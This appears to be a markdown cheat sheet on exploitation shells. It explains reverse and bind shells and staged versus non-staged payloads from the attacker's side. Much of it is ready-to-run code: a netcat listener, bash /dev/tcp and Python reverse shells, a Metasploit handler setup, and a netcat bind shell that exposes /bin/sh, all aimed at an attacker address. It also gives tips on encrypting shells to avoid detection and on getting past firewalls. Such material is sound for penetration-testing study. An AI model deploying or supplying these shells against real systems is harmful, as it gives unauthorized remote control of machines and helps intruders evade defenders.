# Exploitation Shells

## 🔹 Introduction
An **exploitation shell** is a command-line interface established after successfully exploiting a system, allowing an attacker to execute commands remotely. Shells can be categorized into **Reverse Shells** and **Bind Shells**, and they often use different types of **payloads**.

---

## 🔹 Reverse Shell
### **How It Works:**
A **Reverse Shell** is when the **target machine** initiates a connection back to the **attacker’s machine**, which is listening for incoming connections.

### **Why Use a Reverse Shell?**
- Useful when the target is behind **NAT** or a **firewall**.
- Attacker controls the session as soon as the target connects.

### **Setting Up a Listener (Attacker Machine)**
```bash
nc -lvp 4444
```
- **`-l`** → Listen mode.
- **`-v`** → Verbose output (shows connection details).
- **`-p`** → Specify port (in this case, `4444`).

### **Executing a Reverse Shell (Victim Machine)**
#### **Linux Reverse Shell (Bash)**
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
#### **Python Reverse Shell**
```python
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.100",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh", "-i"])
```
#### **Metasploit Reverse Shell**
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

## 🔹 Bind Shell
### **How It Works:**
A **Bind Shell** is when the **target machine** opens a specific port and waits for the attacker to connect to it.

### **Why Use a Bind Shell?**
- Useful when the attacker cannot directly reach the target (e.g., strict outbound firewall rules).
- Less common due to **firewall filtering** and detection.

### **Starting a Bind Shell on Victim Machine**
#### **Linux Bind Shell**
```bash
nc -lvnp 4444 -e /bin/sh
```

### **Connecting to the Bind Shell (Attacker Machine)**
```bash
nc 192.168.1.100 4444
```

---

## 🔹 Staged vs Non-Staged Payloads
### **Staged Payloads**
- **Delivers the payload in small parts** to avoid detection.
- The first-stage shell establishes a connection and downloads a **larger second stage payload**.
- **Example:** `windows/meterpreter/reverse_tcp`

### **Non-Staged Payloads**
- The entire payload is **sent in one go**.
- Faster but easier to detect.
- **Example:** `windows/meterpreter_reverse_tcp`

### **TIPS:**
- If one payload **fails**, try another variant.
- Different OS versions may require different shell techniques.
- **Use encrypted shells (SSL/TLS) to avoid detection.**
- **Try different ports** (some are blocked by firewalls).

---

## 🔹 Conclusion
Understanding **Reverse Shells, Bind Shells, and Payload Types** is crucial in exploitation. Using the right payload and technique can help bypass security defenses and maintain access.

